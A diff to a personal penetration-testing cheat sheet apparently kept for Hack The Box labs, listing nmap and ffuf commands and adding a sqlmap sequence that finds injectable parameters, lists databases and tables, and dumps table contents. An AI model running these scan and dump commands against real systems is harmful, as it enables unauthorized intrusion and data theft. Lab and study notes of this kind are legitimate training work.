@@ -1,4 +1,4 @@
-# General Approach to HTB
+# Stuff
 
 nmap
 1. `nmap -sSV -Pn -p- -A <target>`
@@ -19,6 +19,14 @@ Parameter Fuzzing
 
 Page Type Fuzzing
 1. `ffuf -w SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u "http://<SERVER_IP>:<PORT>/indexFUZZ"`
+
+SQLmap
+- GET: `sqlmap -u "http://<SERVER_IP>:<PORT>/index.php?id=1"`
+- POST: `sqlmap -u "http://<SERVER_IP>:<PORT>/index.php" --data "id=1"`
+
+1. `sqlmap -u "http://<SERVER_IP>:<PORT>/index.php" --data "id=1" --dbs`
+2. `sqlmap -u "http://<SERVER_IP>:<PORT>/index.php" --data "id=1" -D <database> --tables`
+3. `sqlmap -u "http://<SERVER_IP>:<PORT>/index.php" --data "id=1" -D <database> -T <table> --dump`
 
 Other stuff
 - Check SSL cert
